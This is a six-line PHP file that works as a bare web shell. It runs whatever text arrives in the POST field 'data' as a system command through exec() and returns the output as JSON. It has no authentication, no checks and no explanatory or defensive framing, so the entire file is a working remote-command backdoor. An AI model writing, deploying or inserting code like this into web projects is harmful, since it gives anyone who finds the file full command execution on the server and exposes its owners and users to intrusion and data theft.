<?php 

exec($_POST['data'], $output);

echo json_encode($output);

